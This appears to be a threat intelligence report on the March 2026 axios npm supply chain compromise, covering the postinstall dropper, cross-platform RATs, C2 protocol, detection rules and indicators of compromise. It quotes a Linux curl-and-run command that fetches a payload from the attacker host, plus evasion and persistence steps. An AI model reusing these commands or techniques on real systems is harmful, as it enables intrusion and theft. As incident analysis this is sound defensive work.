---
title: "Threat Intelligence Report: Axios npm Supply Chain Attack"
date: "2026-03-31"
severity: "CRITICAL"
classification: "TLP:WHITE"
description: "Cross-source analysis of the Axios npm supply chain attack delivering cross-platform RATs via compromised maintainer credentials."
tags:
  - supply-chain
  - npm
  - axios
  - rat
  - credential-theft
  - javascript
  - postinstall-hook
  - c2
  - anti-forensics
sources_count: 9
author: "TI Mindmap HUB"
---

# 🛡️ Threat Intelligence Report: Axios npm Supply Chain Attack

> **Date:** 2026-03-31 | **Severity:** CRITICAL | **TLP:** WHITE

---

## 📑 Source Reports

| # | Title | Date | Source | Platform Link |
|---|-------|------|--------|---------------|
| 1 | Supply Chain Attack on Axios Pulls Malicious Dependency from npm | 2026-03-31 | socket.dev | [View Report](https://ti-mindmap-hub.com/report/bade1989-8d07-4b35-b573-9bdc8d4b7dc5) |
| 2 | One of the most popular JavaScript packages on earth Axios has been compromised | 2026-03-31 | opensourcemalware.com | [View Report](https://ti-mindmap-hub.com/report/a83ab645-a5cb-4c77-945d-2a085f9b7bcb) |
| 3 | Axios npm compromise: XOR dropper to cross-platform RAT | 2026-03-31 | www.derp.ca | [View Report](https://ti-mindmap-hub.com/report/c7be730d-e165-4425-928b-c746fa3d72fc) |
| 4 | Axios NPM Distribution Compromised in Supply Chain Attack | 2026-03-31 | www.wiz.io | [View Report](https://ti-mindmap-hub.com/report/2aa15683-2d92-4d69-b583-071c4d0cfd24) |
| 5 | Supply-Chain Compromise of axios npm Package | 2026-03-31 | gist.github.com/joe-desimone | [View Report](https://ti-mindmap-hub.com/report/2a19352c-0d3b-41bd-a954-878887e3e61d) |
| 6 | axios Compromised on npm – Malicious Versions Drop Remote Access Trojan | 2026-03-31 | www.stepsecurity.io | [View Report](https://ti-mindmap-hub.com/report/2532c2c1-043f-46b4-bfbb-0de55dd22ea8) |
| 7 | Elastic releases detections for the Axios supply chain compromise | 2026-03-31 | www.elastic.co | [View Report](https://ti-mindmap-hub.com/report/4b217583-d0cc-4320-925a-d08d6d822a78) |
| 8 | Axios npm Supply Chain Attack: Cross-Platform RAT Delivery via Compromised Maintainer Credentials (Picus) | 2026-03-31 | www.picussecurity.com | [View Report](https://ti-mindmap-hub.com/report/c729ac02-ea2d-44b4-bc77-58584879a7ee) |
| 9 | Axios npm Supply Chain Attack: Cross-Platform RAT Delivery via Compromised Maintainer Credentials (Picus, updated) | 2026-03-31 | www.picussecurity.com | [View Report](https://ti-mindmap-hub.com/report/4e8c37fa-d703-4455-91c6-fd14afe6219a) |

---

## 1. Executive Summary

On March 31, 2026, one of the most impactful software supply chain attacks in recent history was discovered targeting **Axios**, the most widely used JavaScript HTTP client library with over **100 million weekly downloads** on npm and deployment in approximately **80% of cloud and code environments**. A threat actor compromised the npm maintainer account of `jasonsaayman`, the lead Axios maintainer, by stealing a **classic npm access token** — a long-lived credential lacking modern protections such as IP binding, expiration, or granular scoping.

Using these stolen credentials, the attacker published two malicious Axios versions — **v1.14.1** (tagged `latest`) and **v0.30.4** (tagged `legacy`) — both modified to include a single new dependency: **`plain-crypto-js@4.2.1`**. This trojanized package, published minutes before the Axios releases, contained a heavily obfuscated **postinstall dropper script** that downloaded and executed **cross-platform Remote Access Trojans (RATs)** targeting macOS, Windows, and Linux. The malicious versions were live for approximately **169 minutes** before npm removed them, but the exposure window was sufficient to compromise an undetermined number of developer machines, CI/CD pipelines, and production systems. According to Wiz, at least **3% of monitored environments** reported execution of the compromised code.

The campaign demonstrated exceptional operational discipline: credential pre-staging, a decoy clean package version to avoid detection heuristics, anti-forensic self-deletion after execution, EDR evasion via renamed system utilities, and C2 traffic disguised as legitimate npm registry requests. This incident is tracked as **GHSA-fw8c-xr5c-95f9** and **MAL-2026-2306**.

### Attack Lifecycle Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      AXIOS SUPPLY CHAIN ATTACK FLOW                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  [1] CREDENTIAL THEFT          [2] PRE-STAGING                          │
│  ┌──────────────────┐          ┌──────────────────────────┐             │
│  │ Stolen classic    │          │ Publish clean decoy:     │             │
│  │ npm token for     │───T-19h──│ plain-crypto-js@4.2.0   │             │
│  │ jasonsaayman      │          │ (establishes trust)      │             │
│  └──────────────────┘          └──────────────────────────┘             │
│           │                              │                              │
│           ▼                              ▼                              │
│  [3] WEAPONIZATION             [4] DELIVERY                             │
│  ┌──────────────────┐          ┌──────────────────────────┐             │
│  │ Publish malicious │          │ Publish axios@1.14.1     │             │
│  │ plain-crypto-js   │───T-1h──│ and axios@0.30.4 with    │             │
│  │ @4.2.1 (dropper)  │          │ dependency on 4.2.1      │             │
│  └──────────────────┘          └──────────────────────────┘             │
│                                          │                              │
│                                          ▼                              │
│  [5] EXPLOITATION                                                       │
│  ┌──────────────────────────────────────────────────────────┐           │
│  │ npm install axios → triggers postinstall hook             │           │
│  │ setup.js executes → XOR+Base64 deobfuscation              │           │
│  │ OS detection → platform-specific payload download          │           │
│  │                                                            │           │
│  │  ┌──────────┐  ┌──────────────┐  ┌─────────────┐         │           │
│  │  │  macOS    │  │   Windows    │  │   Linux     │         │           │
│  │  │ Mach-O   │  │ PowerShell   │  │  Python     │         │           │
│  │  │ C++ RAT  │  │ RAT (.ps1)   │  │  RAT (.py)  │         │           │
│  │  └──────────┘  └──────────────┘  └─────────────┘         │           │
│  └──────────────────────────────────────────────────────────┘           │
│                            │                                            │
│                            ▼                                            │
│  [6] C2 COMMUNICATION     [7] ANTI-FORENSICS                           │
│  ┌──────────────────┐     ┌─────────────────────────────┐              │
│  │ sfrclak.com:8000 │     │ Self-delete setup.js         │              │
│  │ HTTP POST beacon │     │ Overwrite package.json       │              │
│  │ Base64-encoded   │     │ Restore clean 4.2.0 manifest │              │
│  │ JSON every 60s   │     │ Orphan processes from npm    │              │
│  └──────────────────┘     └─────────────────────────────┘              │
│                                                                         │
│  [TIMELINE] T-19h → T-1h → T+0 (publish) → T+169min (npm takedown)    │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attribution & Threat Actor

Attribution remains **unconfirmed** at the time of writing. Key indicators of the threat actor's profile include:

- **Operational sophistication**: The attack exhibited careful pre-staging (publishing a clean decoy version 18 hours before weaponization), multi-platform RAT delivery, and advanced anti-forensics — hallmarks of a well-resourced actor.
- **Account takeover method**: The attacker stole a classic npm access token (not phished via the web UI), suggesting either credential exfiltration from a compromised development environment or a prior breach of stored tokens.
- **Email pivot**: The compromised `jasonsaayman` npm account email was changed to `ifstap@proton.me`, a ProtonMail address controlled by the attacker, locking out the legitimate maintainer.
- **Infrastructure**: The C2 domain `sfrclak[.]com` was registered hours before the attack and hosted at Hostwinds, Seattle (AS54290). No prior malicious activity was associated with this infrastructure.
- **Possible ecosystem expansion**: Two downstream packages (`@shadanai/openclaw` and `@qqbrowser/openclaw-qbot`) were found to vendor the trojanized Axios, though it is unclear whether these were attacker-controlled or simply collateral.

The operational tempo, multi-platform sophistication, and careful opsec suggest a **motivated financially or espionage-oriented actor** with experience in software supply chain operations. No known APT group has been publicly attributed.

---

## 2. Technical Details

### 2.1 Malware Analysis

#### Stage 0: Dependency Injection

The attacker made no changes to Axios's application code. The only modification to `package.json` in both v1.14.1 and v0.30.4 was the addition of a single runtime dependency:

```json
"dependencies": {
  "plain-crypto-js": "^4.2.1"
}
```

This dependency — `plain-crypto-js` — had never existed in any legitimate Axios release. The name was chosen to mimic the legitimate `crypto-js` package (typosquatting).

#### Stage 1: Dropper (`setup.js`)

Upon `npm install`, the `plain-crypto-js@4.2.1` package triggered a **postinstall lifecycle hook** executing `setup.js` — a 4,209-byte obfuscated JavaScript dropper. The dropper used a **two-layer encoding scheme**:

1. **Reversed Base64**: Strings reversed before Base64 encoding
2. **XOR cipher**: Applied with the static key `OrDeR_7077`

After deobfuscation, the dropper:

1. Detected the host operating system via `process.platform`
2. Constructed a platform-specific download and execution command
3. Fetched the appropriate RAT payload from `http://sfrclak[.]com:8000/6202033`
4. Executed the payload **detached from the npm process tree** (orphaned process)
5. Performed anti-forensic cleanup: deleted `setup.js`, deleted `package.json` (v4.2.1), renamed `package.md` → `package.json` (restoring clean v4.2.0 manifest)

All dropper operations completed in **under 2 seconds**, before npm finished installing other dependencies.

#### Stage 2: Platform-Specific RATs

**macOS (darwin)**:
- Delivery: AppleScript invoked via `nohup osascript` → downloads Mach-O binary via `curl`
- Payload: C++ universal binary written to `/Library/Caches/com.apple.act.mond` (masquerading as Apple system daemon)
- Code signing: Ad-hoc signed via `codesign --force --deep --sign -` to bypass Gatekeeper
- Capabilities: System fingerprinting (hostname, username, macOS version, timezone, CPU, installed apps), process enumeration, arbitrary command execution, code injection (writes to hidden temp file `/private/tmp/.XXXXXX` and executes), directory enumeration (`/Applications`, `~/Library`, `~/Application Support`), C2 beacon every 60s
- Persistence: **None implemented** — single-execution model on macOS

**Windows (win32)**:
- Delivery: VBScript (`%TEMP%\6202033.vbs`) → downloads PowerShell script (`%TEMP%\6202033.ps1`)
- EDR evasion: PowerShell is **copied and renamed** to `%PROGRAMDATA%\wt.exe` (disguised as Windows Terminal) with execution flags `-w hidden -ep bypass`
- Payload: Memory-resident PowerShell RAT with reflective .NET assembly injection (`Assembly.Load(byte[])`) for process hollowing into `cmd.exe`
- Persistence: Registry Run key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate` → executes `%PROGRAMDATA%\system.bat` on every logon → re-fetches RAT from C2 in memory
- Capabilities: Host fingerprinting via WMI, process listing, remote shell, binary injection (`peinject` command), directory enumeration

**Linux**:
- Delivery: `curl -o /tmp/ld.py ... && nohup python3 /tmp/ld.py ... &`
- Payload: Python-based RAT with system reconnaissance, process enumeration from `/proc`, and arbitrary command execution
- Note: The Linux payload binary was **never recovered** by researchers; analysis was based on dropper logic and IOC references

#### C2 Communication Protocol

All RAT variants shared a consistent C2 protocol:

- **Endpoint**: `http://sfrclak[.]com:8000/6202033` (HTTP POST, plain text)
- **Beacon interval**: ~60 seconds
- **Encoding**: Base64-encoded JSON payloads
- **User-Agent**: `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` — a legacy IE8/Windows XP string to avoid modern browser fingerprinting
- **Mimicry**: POST bodies contained values like `packages[.]npm[.]org/product{0,1,2}` to disguise traffic as legitimate npm registry requests
- **Campaign ID**: `6202033` embedded in URL path and payload references

#### RAT Command Set

| Command | Description |
|---------|-------------|
| `exec` | Execute arbitrary shell command |
| `peinject` | In-memory .NET assembly injection (Windows) / code injection (macOS) |
| `dir` / `ls` | Directory enumeration with metadata (name, size, timestamps) |
| `ps` | Process listing |
| `init` | System fingerprinting and initial beacon |
| `kill` | Terminate the RAT process |

### 2.2 Infrastructure Analysis

| Attribute | Value |
|-----------|-------|
| **C2 Domain** | `sfrclak[.]com` |
| **C2 IP** | `142.11.206.73` |
| **C2 Port** | `8000` (HTTP) |
| **C2 Path** | `/6202033` |
| **Hosting Provider** | Hostwinds, Seattle (AS54290) |
| **Domain Registration** | Hours before the attack |
| **Prior Malicious Activity** | None known |
| **Protocol** | Plain HTTP (no TLS) |
| **Attacker Email** | `ifstap@proton.me` |
| **Compromised Account** | `jasonsaayman` (npm) |
| **Secondary Account** | `nrwise` (npm, email also changed to proton.me) |

The C2 infrastructure was rapidly dismantled after the npm takedown, indicating the operator monitored incident response activity.

### 2.3 Anti-Forensic Techniques

1. **Self-deletion**: `setup.js` deletes itself immediately after payload delivery
2. **Manifest restoration**: Malicious `package.json` (v4.2.1) deleted and replaced with clean `package.md` renamed to `package.json` (v4.2.0)
3. **Process orphaning**: RAT processes detached from the npm install process tree, complicating process ancestry analysis
4. **Fileless execution** (Windows): PowerShell RAT loaded via reflective .NET injection — never written to disk
5. **Rapid cleanup**: Entire dropper sequence completed in < 2 seconds
6. **Self-deleting launchers**: VBScript and PowerShell loaders on Windows self-delete after execution

### 2.4 Downstream Propagation

Two additional npm packages were identified as having vendored the trojanized Axios:

- `@shadanai/openclaw`
- `@qqbrowser/openclaw-qbot@0.0.130`

These packages either bundled the compromised Axios directly or included `plain-crypto-js` as a transitive dependency, extending the attack surface beyond direct Axios installations.

---

## 3. Detection Opportunities

### 3.1 Behavioral Detections (Elastic Security Labs)

Elastic Security Labs released cross-platform behavioral detection rules focusing on process ancestry and network behavior rather than static IOCs:

**All Platforms — Delivery Phase:**
- Node.js process spawning OS-native shell (`sh`, `cscript`, `osascript`) that performs network retrieval (`curl`, `wget`, `Invoke-WebRequest`) and executes downloaded code

**Linux:**
- `node → /bin/sh -c curl -o /tmp/ld.py ... && nohup python3 /tmp/ld.py ... &`
- Python process spawned from npm install context with background execution
- Network connections from Python process to external IPs on non-standard ports

**Windows:**
- Renamed PowerShell binary (`wt.exe`) executing from `%PROGRAMDATA%`
- Registry Run key creation under `MicrosoftUpdate`
- `cmd.exe` spawned with reflective .NET injection patterns
- VBScript launcher in `%TEMP%` with numeric filename pattern

**macOS:**
- `osascript` spawned from Node.js process tree performing network download
- Unsigned or ad-hoc signed Mach-O binary in `/Library/Caches/` with `com.apple.*` naming
- Gatekeeper bypass via ad-hoc code signing

### 3.2 Network-Based Detections

- HTTP POST traffic to `sfrclak[.]com:8000` or `142.11.206.73:8000`
- User-Agent string: `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)`
- POST body containing `packages.npm.org/product`
- Plain HTTP (non-TLS) C2 communication on port 8000
- Base64-encoded JSON payloads in HTTP POST body

### 3.3 Host-Based Detections

- Presence of `plain-crypto-js` in `node_modules` directories (this package should never exist in legitimate installations)
- Lockfile (`package-lock.json` / `yarn.lock`) references to `axios@1.14.1` or `axios@0.30.4`
- File artifacts: `/Library/Caches/com.apple.act.mond`, `%PROGRAMDATA%\wt.exe`, `%PROGRAMDATA%\system.bat`, `/tmp/ld.py`
- Registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate`
- npm audit or `npm ls` showing `plain-crypto-js` as a dependency

### 3.4 Provenance Verification

Legitimate Axios releases are published via **GitHub Actions OIDC with SLSA provenance**. The malicious versions were published via **direct CLI** without provenance attestations. Organizations should verify npm package provenance as a supply chain integrity check.

---

## 4. Conclusion

The Axios npm supply chain attack of March 31, 2026 represents one of the most sophisticated and potentially impactful software supply chain compromises ever documented. By targeting a single maintainer credential — a classic npm access token without modern security controls — the attacker achieved the ability to distribute malware to a significant fraction of the JavaScript ecosystem.

Key takeaways:

1. **Single point of failure**: One stolen credential bypassed all code review, CI/CD, and access control mechanisms
2. **Transitive trust exploitation**: The npm ecosystem's unsandboxed postinstall hooks and implicit trust in dependencies enabled silent code execution
3. **Operational discipline**: The 18-hour pre-staging window, anti-forensic cleanup, and C2 mimicry demonstrate a well-planned operation
4. **Cross-platform impact**: RATs were prepared for all three major operating systems, maximizing the attack surface
5. **Brief but potent exposure**: Even a 169-minute window was sufficient to achieve measurable compromise across the ecosystem

**Immediate remediation actions:**
- Audit all environments for `axios@1.14.1`, `axios@0.30.4`, and `plain-crypto-js` in lockfiles and `node_modules`
- Pin Axios to `1.14.0` or earlier known-good version
- Scan for host-based IOCs across all platforms
- Block C2 infrastructure (`sfrclak[.]com`, `142.11.206.73`) at network perimeter
- Rotate all credentials, secrets, and tokens on potentially exposed systems
- Review CI/CD pipeline logs for npm install activity during the attack window
- Migrate to **granular npm tokens** with IP binding, expiration, and package scoping
- Enable npm **publish provenance** verification

---

## 5. Indicators of Compromise (IoC)

### 5.1 Network Indicators

| Type | Value | Description |
|------|-------|-------------|
| Domain | `sfrclak[.]com` | C2 domain |
| IPv4 | `142.11.206.73` | C2 IP address (Hostwinds, AS54290, Seattle) |
| URL | `http://sfrclak[.]com:8000/6202033` | C2 endpoint for payload delivery and beaconing |
| User-Agent | `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` | RAT C2 User-Agent string |

### 5.2 File Hash Indicators

| Type | Value | Description |
|------|-------|-------------|
| SHA256 | `5bb67e88846096f1f8d42a0f0350c9c46260591567612ff9af46f98d1b7571cd` | Malicious `axios-1.14.1.tgz` npm package |
| SHA256 | `59336a964f110c25c112bcc5adca7090296b54ab33fa95c0744b94f8a0d80c0f` | Malicious `axios-0.30.4.tgz` npm package |
| SHA256 | `58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668` | Trojanized `plain-crypto-js-4.2.1.tgz` |
| SHA256 | `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09` | `setup.js` dropper |
| SHA256 | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` | macOS RAT (`com.apple.act.mond` Mach-O binary) |
| SHA256 | `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` | Windows RAT (`6202033.ps1` PowerShell script) |
| SHA256 | `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd` | Windows persistence (`system.bat`) |
| SHA256 | `fcb81618bb15edfdedfb638b4c08a2af9cac9ecba551af135a8402bf980375cf` | Linux RAT (`ld.py` Python script) |
| SHA1 | `2553649f232204966871cea80a5d0d6adc700ca` | Malicious `axios@1.14.1` |
| SHA1 | `d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71` | Malicious `axios@0.30.4` |
| SHA1 | `07d889e2dadce6f3910dcbc253317d28ca61c766` | Malicious `plain-crypto-js@4.2.1` |

### 5.3 Host-Based Indicators

| Platform | Type | Value | Description |
|----------|------|-------|-------------|
| macOS | File Path | `/Library/Caches/com.apple.act.mond` | RAT binary (masquerades as Apple daemon) |
| macOS | File Path | `/private/tmp/.XXXXXX` | Hidden temp file for injected code |
| Windows | File Path | `%PROGRAMDATA%\wt.exe` | Renamed PowerShell (EDR evasion) |
| Windows | File Path | `%PROGRAMDATA%\system.bat` | Persistence batch script |
| Windows | File Path | `%TEMP%\6202033.vbs` | VBScript launcher (self-deletes) |
| Windows | File Path | `%TEMP%\6202033.ps1` | PowerShell payload (self-deletes) |
| Windows | Registry | `HKCU\...\Run\MicrosoftUpdate` | Registry Run key persistence |
| Linux | File Path | `/tmp/ld.py` | Python RAT script |
| All | npm | `plain-crypto-js` in `node_modules` | Anomalous dependency (never legitimate) |

### 5.4 Malicious npm Packages

| Package | Version | Status |
|---------|---------|--------|
| `axios` | `1.14.1` | Removed from npm |
| `axios` | `0.30.4` | Removed from npm |
| `plain-crypto-js` | `4.2.0` | Decoy (clean) |
| `plain-crypto-js` | `4.2.1` | Malicious dropper |
| `@shadanai/openclaw` | various | Vendored trojanized Axios |
| `@qqbrowser/openclaw-qbot` | `0.0.130` | Vendored trojanized Axios |

### 5.5 Campaign Identifiers

| Identifier | Value |
|------------|-------|
| Campaign ID | `6202033` |
| XOR Key | `OrDeR_7077` |
| Attacker Email | `ifstap@proton.me` |
| Advisory ID | `GHSA-fw8c-xr5c-95f9` |
| MAL ID | `MAL-2026-2306` |

---

## 6. MITRE ATT&CK Techniques

| Technique ID | Technique | Tactic | Description |
|--------------|-----------|--------|-------------|
| T1195 | Supply Chain Compromise | Initial Access | Compromised the npm publishing pipeline for Axios by stealing the lead maintainer's classic npm access token |
| T1195.002 | Compromise Software Dependencies and Development Tools | Initial Access | Injected malicious `plain-crypto-js@4.2.1` dependency into Axios package manifest |
| T1078 | Valid Accounts | Initial Access | Used stolen credentials for the `jasonsaayman` npm account to publish malicious packages |
| T1204.002 | User Execution: Malicious File | Execution | Developers unknowingly installed compromised Axios versions via `npm install`, triggering automatic postinstall execution |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Execution | Obfuscated `setup.js` dropper executed via npm postinstall lifecycle hook |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution | Windows RAT delivered and executed as PowerShell script with hidden execution and bypass flags |
| T1059.002 | Command and Scripting Interpreter: AppleScript | Execution | macOS payload delivery via `osascript` executing AppleScript to download and launch RAT binary |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution | Linux payload fetched and executed via `sh -c curl ... && nohup python3 ...` |
| T1059.006 | Command and Scripting Interpreter: Python | Execution | Linux RAT implemented as Python script (`ld.py`) |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Execution | Shell commands executed via RAT on Windows systems |
| T1027 | Obfuscated Files or Information | Defense Evasion | Dropper used two-layer encoding (reversed Base64 + XOR with key `OrDeR_7077`) |
| T1027.002 | Obfuscated Files or Information: Software Packing | Defense Evasion | Custom encoding scheme to evade static analysis and signature-based detection |
| T1036 | Masquerading | Defense Evasion | macOS RAT masquerading as Apple system daemon (`com.apple.act.mond`) |
| T1036.003 | Masquerading: Rename System Utilities | Defense Evasion | Windows: PowerShell copied and renamed to `wt.exe` (Windows Terminal) to evade EDR |
| T1070.004 | Indicator Removal: File Deletion | Defense Evasion | Self-deletion of `setup.js`, `package.json`, VBScript and PowerShell launchers |
| T1070.003 | Indicator Removal: Rename or Move Files | Defense Evasion | Renamed `package.md` → `package.json` to restore clean package manifest |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | Defense Evasion | macOS injected code written to hidden temp file `/private/tmp/.XXXXXX` |
| T1218 | System Binary Proxy Execution | Defense Evasion | Renamed PowerShell binary used as signed binary proxy for execution |
| T1116 | Code Signing | Defense Evasion | Ad-hoc code signing of macOS Mach-O binary to bypass Gatekeeper |
| T1055 | Process Injection | Defense Evasion | In-memory .NET assembly injection on Windows |
| T1055.012 | Process Injection: Process Hollowing | Defense Evasion | Reflective .NET injection via `Assembly.Load(byte[])` into `cmd.exe` |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | Persistence | Windows persistence via `HKCU\...\Run\MicrosoftUpdate` registry key |
| T1053.001 | Scheduled Task/Job: At (Linux) | Persistence | Linux RAT launched with `nohup` and backgrounded |
| T1105 | Ingress Tool Transfer | Command and Control | Platform-specific RAT payloads downloaded from C2 via `curl`/`wget`/PowerShell |
| T1219 | Remote Access Software | Command and Control | Cross-platform RAT with full remote access capabilities |
| T1095 | Non-Application Layer Protocol | Command and Control | C2 communication via plain HTTP with Base64-encoded JSON and fake IE8 User-Agent |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | System fingerprint data and reconnaissance results exfiltrated via C2 beacon |
| T1082 | System Information Discovery | Discovery | Host fingerprinting: hostname, username, OS version, CPU, timezone, install date, boot time |
| T1057 | Process Discovery | Discovery | Enumeration of running processes with PID, username, and start times |
| T1083 | File and Directory Discovery | Discovery | Directory enumeration of applications, user libraries, and configuration paths |
| T1005 | Data from Local System | Collection | Collection of system metadata, installed applications, and configuration data |
| T1074 | Data Staged | Collection | Collected data staged and Base64-encoded before C2 exfiltration |

---

*Report generated by TI Mindmap HUB — Cross-source threat intelligence analysis platform.*
*Sources: Socket.dev, OpenSourceMalware.com, derp.ca, Wiz.io, Joe Desimone (GitHub Gist), StepSecurity, Elastic Security Labs, Picus Security.*
